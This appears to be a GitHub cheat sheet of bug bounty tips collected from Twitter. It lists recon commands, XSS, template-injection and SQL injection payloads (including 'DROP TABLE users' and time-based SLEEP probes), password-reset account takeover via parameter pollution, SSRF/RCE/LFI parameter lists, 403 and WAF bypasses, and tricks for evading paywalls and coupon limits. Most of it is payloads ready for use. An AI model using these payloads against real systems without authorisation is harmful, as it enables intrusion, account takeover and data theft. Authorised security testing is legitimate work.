### BugBounty Tips	
Collection of `#bugbountytips` from twitter.
# Recon
```
Google the compay copyright footer to get more domains.
Use whoxy.com to perform reverse whois lookups with the email used to regioster the main domain/
Search for slide,docs,demos and video tutorials by your target. Manny innocent examples could leak juicy endpoints.
Use OpenSSL to get certificates. They can contain valuable info and common names form fidning more subdomains.
Try to recreate data from deleted accounts by siging up with the old email address.
Check text version of HTML e-mail for template injections
When testing Rails Application add .json to url endpoints.
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"* 
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

# Tools
```
Use exiftool to extract metadata from documents, it might reveal vulnerable htmltopdf generators
Use cloud_enum to find open google buckets or azure accounts 
Use Grep to extract endpoints with grep: grep -o -E '(https?://)?/?[{}a-z0-9A-Z_\.-]{2,}/[{}/a-z0-9A-Z_\.-]+'
Use WayBackmachine combined with paraminer or parameth
Passive parameter mining web.archive.org /cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey
```

# Payloads
```
Inject payloads in parameter names, ?<script>alerty</script>=true
Use youtube(olx, etc...) videos with xss in names.
Use round brackets to inject payload into valid e-mail address.
X-Forwarded-For: ${payload}
Use longstring parameters for stacktrace.
WAFBYPASS ?page=";confirm`1`//   Rightwards -> 302; ?pag%65=";confirm`1`//   Rightwards -> 200 + XSS!
Redirect bypass %26next=http://example.com 
When testing nodejs site add %ff at the end of url https://target.com/%ff, most of times cause error and return stacktrace with full path
Add [] to name of parrameter: pwd= ->pwd[]=
when interacting with db try to put % in parameter  ?item=%
```

# Authentication & Autorization 
```
UUID Idor Trick, Register user with the same name, it maybe return uuid.
Try to bruteforce login endpoint. /login/${oauth_provider}, login/facebook, login/oauth/twitter login/oauth/v2/yahoo
403 Forbidden bypass, https://host.com/path =403, https://host.com/%2e/path = 200, 
Bypass paywalls by using Google Bot user agent.
User securitytrails.com to find the originating server IP
Do match and replace form false to true.
Set your birthday for today ot tomorrow to get discounts.
Skip steps: /step/shipping ->  ~~/step/payment~~ -> /step/confirm
Check does blackfriday coupon codes expires.
Use blind xss as password.
Login to site using Facebook and try tochange userid during POST requests
/api/v1/users/profile?id=MYID&id=ANOTHERUSERID -> HTTP 200 
```

# Email Address input fuzz
```
test+(<script>alert(1)</script>)@example.com
test@example(<script>alert(1)</script>).com
"<script>alert(1)</script>"@example.com

"<%=7*7%>"@example.com
test+(${{7*7}})@example.com

"'OR 1=1--"@example.com
"mail');DROP TABLE users;--"@example.com

test@example.burpcollaborator.net
test@[127.0.0.1]

victim&email=attacker@example.com

"%0d%0aContent-Lenght:%200@0d%0a%0d%0a"@example.com"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```
# Account takeover via Email 
```
GET /passwordreset

Double parameter (aka. HPP / HTTP parameter pollution):
email=victim@xyz.tld&email=hacker@xyz.tld
Carbon copy:
email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
Using separators:
email=victim@xyz.tld,hacker@xyz.tld
email=victim@xyz.tld%20hacker@xyz.tld
email=victim@xyz.tld|hacker@xyz.tld
No domain:
email=victim
No TLD (Top Level Domain):
email=victim@xyz
JSON table:
{"email":["victim@xyz.tld","hacker@xyz.tld"]}
```
# Password Reset:
```
reset userpassword: user@email.com.burpcolaborator.com
```
# Find GET parameters in example.com
```
assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
```
# Top 25 SSRF parameters
```
?dest={target}
?redirect={target}
?uri={target}
?path={target}
?continue={target}
?url={target}
?window={target}
?next={target}
?data={target}
?reference={target}
?site={target}
?html={target}
?val={target}
?validate={target}
?domain={target}
?callback={target}
?return={target}
?page={target}
?feed={target}
?host={target}
?port={target}
?to={target}
?out={target}
?view={target}
?dir={target}
```
# Top 25 RCE parameters
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
# Top 25 LFI parameters
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
# MORE PARAMETERS
https://github.com/1ndianl33t/Gf-Patterns

# Massive XSS
```
#!/bin/bash
# $1 => example.domain

subfinder -d $1 -o domains_subfinder_$1
amass enum --passive -d $1 -o domains_$1

cat domains_subfinder_$1 | tee -a domain_$1
cat domains_$1 | filter-resolved | tee -a domains_$1.txt

cat domains_$1.txt | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
```
# Masive Top Parameters search
```
TBA 
echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```
# File Upload and what to search
```
ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
SVG: Stored XSS / SSRF / XXE
GIF: Stored XSS / SSRF
CSV: CSV injection
XML: XXE
AVI: LFI / SSRF
HTML / JS : HTML injection / XSS / Open redirect
PNG / JPEG: Pixel flood attack (DoS)
ZIP: RCE via LFI / DoS
PDF / PPTX: SSRF / BLIND XXE
```
# Find JavaScript Files in Target.com
```
echo target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
or
cat domains | httpx -silent | subjs | anew
```
# Extract endpoints from \*.js 
```
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
```

# 403 bypass
```
https://target.com/admin/ –> HTTP 302 (redirect to login page)
https://target.com/admin..;/ –> HTTP 200 OK

https://target.com/../admin
https://target.com/whatever/..;/admin

site.com/secret –> HTTP 403 Forbidden
site.com/secret/ –> HTTP 200 OK
site.com/secret/. –> HTTP 200 OK
site.com//secret// –> HTTP 200 OK
site.com/./secret/.. –> HTTP 200 OK
```
# Data leakage through .json
```
Here’s a tip to achieve sensitive data leak using .json extension.

Request:
GET /ResetPassword HTTP/1.1
{"email":"victim@example.com"}

Response:
HTTP/1.1 200 OK
Now let’s try this instead:

Request:
GET /ResetPassword.json HTTP/1.1
{"email":"victim@example.com"}

Response:
HTTP/1.1 200 OK
{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}
```
# Generate wordlis for target
```
echo "bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yolo | sed $'s/[./?=:&#]/\\n/g' | anew
```

# Check for SQLi
```
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'  <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```
# SQLi in Email parameter
```
| Payload | Response |Injection Status |
| ------ | ------ |------ |
|{“email”:”asd@a.com”}| {“code”:2002,”status”:200,”message”:”Email not found.”}|	Valid|
|{“email”:”asd a@a.com”}|	{“code”:2002,”status”:200,”message”:”Bad format”}|	Not Valid|	
|{“email”:”\”asd a\”@a.com”}|	{“code”:2002,”status”:200,”message”:”Bad format”}|	Not Valid|	
|{“email”:”asd(a)@a.com”}|	{“code”:2002,”status”:200,”message”:”Bad format”}|	Not Valid|	
|{“email”:”\”asd(a)\”@a.com”}|	{“code”:2002,”status”:200,”message”:”Email not found.”}|	Valid|	
|{“email”:”asd’a@a.com”}|	{“code”:0,”status”:500,”message”:”Unspecified error”}|	Not Valid|	
|{“email”:”asd’or’1’=’1@a.com”}|	{“code”:2002,”status”:200,”message”:”Email not found.”}	Valid|	
|{“email”:”a’-IF(LENGTH(database())>9,SLEEP(7),0)or’1’=’1@a.com”}|	{“code”:2002,”status”:200,”message”:”Bad format”}|	Not Valid|
|{“email”:”\”a’-IF(LENGTH(database())>9,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	Delay: 7,854 milis|
|{“email”:”\”a’-IF(LENGTH(database())=10,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	Delay: 8,696 milis|
|{“email”:”\”a’-IF(LENGTH(database())=11,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	No delay|

```

### Cool BurpPlugins
```
Autorize – To test BACs (Broken Access Control)
Burp Bounty – Profile-based scanner
Active Scan++ – Add more power to Burp’s Active Scanner
AuthMatrix – Authorization/PrivEsc checks
Broken Link Hijacking – For BLH (Broken Link Hijacking)
Collaborator Everywhere – Pingback/SSRF (Server-Side Request Forgery)
Command Injection Attacker
Content-Type Converter – Trying to bypass certain restrictions by changing Content-Type
Decoder Improved – More decoder features
Freddy – Deserialization
Flow – Better HTTP history
Hackvertor – Handy type conversion
HTTP Request Smuggler
Hunt – Potential vuln identifier
InQL – GraphQL Introspection testing
J2EE Scan – Scanning J2EE apps
JSON/JS Beautifier
JSON Web Token Attacker
ParamMiner – Mine hidden parameters
Reflected File Download Checker
Reflected Parameter – Potential reflection
SAML Raider – SAML testing
Upload Scanner – File upload tester
Web Cache Deception Scanner
```
